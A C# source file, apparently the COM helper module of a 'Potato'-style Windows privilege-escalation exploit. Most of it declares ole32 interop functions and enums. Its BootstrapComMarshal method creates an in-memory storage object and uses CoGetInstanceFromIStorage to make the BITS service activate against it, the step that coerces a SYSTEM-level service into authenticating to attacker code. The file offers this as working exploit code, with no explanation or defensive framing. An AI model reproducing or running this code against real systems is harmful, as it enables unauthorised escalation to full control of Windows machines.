using Microsoft.VisualStudio.OLE.Interop;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace Potato
{
    static class ComUtils
    {
        [DllImport("ole32.dll")]
        static extern int CreateObjrefMoniker(IntPtr punk, out IMoniker ppmk);

        [DllImport("ole32.dll")]
        static extern int CreateBindCtx(int reserved, out IBindCtx ppbc);

        [StructLayout(LayoutKind.Sequential)]
        struct MULTI_QI
        {
            public IntPtr pIID;
            [MarshalAs(UnmanagedType.Interface)]
            public object pItf;
            public int hr;
        }

        [Flags]
        public enum STGM : int
        {
            DIRECT = 0x00000000,
            TRANSACTED = 0x00010000,
            SIMPLE = 0x08000000,
            READ = 0x00000000,
            WRITE = 0x00000001,
            READWRITE = 0x00000002,
            SHARE_DENY_NONE = 0x00000040,
            SHARE_DENY_READ = 0x00000030,
            SHARE_DENY_WRITE = 0x00000020,
            SHARE_EXCLUSIVE = 0x00000010,
            PRIORITY = 0x00040000,
            DELETEONRELEASE = 0x04000000,
            NOSCRATCH = 0x00100000,
            CREATE = 0x00001000,
            CONVERT = 0x00020000,
            FAILIFTHERE = 0x00000000,
            NOSNAPSHOT = 0x00200000,
            DIRECT_SWMR = 0x00400000,
        }

        [StructLayout(LayoutKind.Sequential)]
        class COSERVERINFO
        {
            public uint dwReserved1;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string pwszName;
            public IntPtr pAuthInfo;
            public uint dwReserved2;
        }

        [DllImport("ole32.dll", PreserveSig = false, CharSet = CharSet.Unicode)]
        static extern void StgCreateDocfile([MarshalAs(UnmanagedType.LPWStr)]
            string pwcsName, STGM grfMode, uint reserved, out IStorage ppstgOpen);

        const uint GMEM_MOVEABLE = 2;

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr GlobalAlloc(uint uFlags, UIntPtr dwBytes);

        [DllImport("ole32.dll", PreserveSig = false, ExactSpelling = true)]
        static extern void CreateILockBytesOnHGlobal(
                IntPtr hGlobal,
                [MarshalAs(UnmanagedType.Bool)] bool fDeleteOnRelease,
                out IntPtr ppLkbyt);

        static IntPtr GuidToPointer(string guid)
        {
            Guid g = new Guid(guid);
            IntPtr ret = Marshal.AllocCoTaskMem(16);
            Marshal.Copy(g.ToByteArray(), 0, ret, 16);
            return ret;
        }

        [DllImport("ole32.dll", PreserveSig = false, ExactSpelling = true)]
        static extern void StgCreateDocfileOnILockBytes(IntPtr plkbyt, STGM grfMode, uint reserved, out IStorage ppstgOpen);

        [DllImport("ole32.dll", PreserveSig = false, ExactSpelling = true)]
        static extern void CoGetInstanceFromIStorage(COSERVERINFO pServerInfo, ref Guid pclsid,
           [MarshalAs(UnmanagedType.IUnknown)] object pUnkOuter, CLSCTX dwClsCtx,
           IStorage pstg, uint cmq, [In, Out] MULTI_QI[] rgmqResults);

        [DllImport("ole32.dll", PreserveSig = false, ExactSpelling = true, CharSet = CharSet.Unicode)]
        static extern void CoGetInstanceFromFile(
            COSERVERINFO pServerInfo,
            ref Guid pClsid,
            [MarshalAs(UnmanagedType.IUnknown)] object pUnkOuter,
            CLSCTX dwClsCtx,
            STGM grfMode,
            string pwszName,
            uint cmq,
            [In, Out] MULTI_QI[] rgmqResults);

        [DllImport("ole32.dll", CharSet = CharSet.Unicode, ExactSpelling = true, PreserveSig = false)]
        static extern void CoCreateInstanceEx(
           [In, MarshalAs(UnmanagedType.LPStruct)] Guid rclsid,
           [MarshalAs(UnmanagedType.IUnknown)] object pUnkOuter,
           CLSCTX dwClsCtx,
           COSERVERINFO pServerInfo,
           uint cmq,
           [In, Out] MULTI_QI[] pResults);

        public delegate uint OleStreamMethod(IntPtr a, IntPtr b, uint c);

        [StructLayout(LayoutKind.Sequential)]
        public class OLESTREAM
        {
            [MarshalAs(UnmanagedType.FunctionPtr)]
            public OleStreamMethod GetMethod;
            [MarshalAs(UnmanagedType.FunctionPtr)]
            public OleStreamMethod SetMethod;
        }

        [DllImport("ole32.dll", CharSet = CharSet.Unicode, ExactSpelling = true, PreserveSig = false)]
        static extern void OleConvertOLESTREAMToIStorage(ref OLESTREAM lpolestream, IStorage pstg, IntPtr ptd);

        [DllImport("Shlwapi.dll", CharSet = CharSet.Unicode, PreserveSig = false)]
        static extern void SHCreateStreamOnFile(string pszFile, STGM grfMode, out IStream ppstm);

        [Flags]
        public enum CLSCTX : uint
        {
            CLSCTX_INPROC_SERVER = 0x1,
            CLSCTX_INPROC_HANDLER = 0x2,
            CLSCTX_LOCAL_SERVER = 0x4,
            CLSCTX_INPROC_SERVER16 = 0x8,
            CLSCTX_REMOTE_SERVER = 0x10,
            CLSCTX_INPROC_HANDLER16 = 0x20,
            CLSCTX_RESERVED1 = 0x40,
            CLSCTX_RESERVED2 = 0x80,
            CLSCTX_RESERVED3 = 0x100,
            CLSCTX_RESERVED4 = 0x200,
            CLSCTX_NO_CODE_DOWNLOAD = 0x400,
            CLSCTX_RESERVED5 = 0x800,
            CLSCTX_NO_CUSTOM_MARSHAL = 0x1000,
            CLSCTX_ENABLE_CODE_DOWNLOAD = 0x2000,
            CLSCTX_NO_FAILURE_LOG = 0x4000,
            CLSCTX_DISABLE_AAA = 0x8000,
            CLSCTX_ENABLE_AAA = 0x10000,
            CLSCTX_FROM_DEFAULT_CONTEXT = 0x20000,
            CLSCTX_ACTIVATE_32_BIT_SERVER = 0x40000,
            CLSCTX_ACTIVATE_64_BIT_SERVER = 0x80000,
            CLSCTX_INPROC = CLSCTX_INPROC_SERVER | CLSCTX_INPROC_HANDLER,
            CLSCTX_SERVER = CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_REMOTE_SERVER,
            CLSCTX_ALL = CLSCTX_SERVER | CLSCTX_INPROC_HANDLER
        }
        //
        public static IStorage CreateStorage()
        {
            IntPtr gh = IntPtr.Zero;
            IntPtr lb;
            IStorage ret;
            CreateILockBytesOnHGlobal(gh, true, out lb);
            StgCreateDocfileOnILockBytes(lb, STGM.CREATE | STGM.READWRITE | STGM.SHARE_EXCLUSIVE, 0, out ret);
            return ret;
        }
        //
        public static void BootstrapComMarshal()
        {
            IStorage stg = CreateStorage();
            
            Guid clsid = new Guid("4991d34b-80a1-4291-83b6-3328366b9097");

            TestClass c = new TestClass(stg);

            MULTI_QI[] qis = new MULTI_QI[1];

            qis[0].pIID = GuidToPointer("00000000-0000-0000-C000-000000000046");
            qis[0].pItf = null;
            qis[0].hr = 0;

            CoGetInstanceFromIStorage(null, ref clsid, null, CLSCTX.CLSCTX_LOCAL_SERVER, c, 1, qis);

        }
    }
}